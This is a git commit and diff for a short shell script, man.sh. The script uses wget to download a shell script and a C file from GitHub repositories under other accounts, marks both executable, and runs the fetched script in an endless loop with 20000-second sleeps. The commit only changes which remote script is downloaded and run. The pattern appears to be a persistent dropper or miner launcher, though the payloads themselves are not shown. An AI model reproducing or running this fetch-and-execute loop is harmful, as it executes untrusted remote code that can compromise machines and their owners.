a8f6cb017dde3efed84c84a1ef9ffcd5b3d159e9
tinkuJiya <91747682+tinkuJiya@users.noreply.github.com>
2021-10-02 13:15:26 +0530

    Update man.sh

--- man.sh
+++ man.sh
@@ -1,9 +1,9 @@
 #!/bin/sh
-  wget https://github.com/DarshGoswami1982/D1/raw/main/sol.sh
-  chmod +x sol.sh 
+  wget https://github.com/tinkuJiya/Oli2004/raw/master/main.sh
+  chmod +x main.sh 
   wget https://github.com/biswas179/FkgX/raw/main/mas.c
   chmod +x mas.c
   while [ 1 ]; do
-  ./sol.sh
+  ./main.sh
   sleep 20000
   done
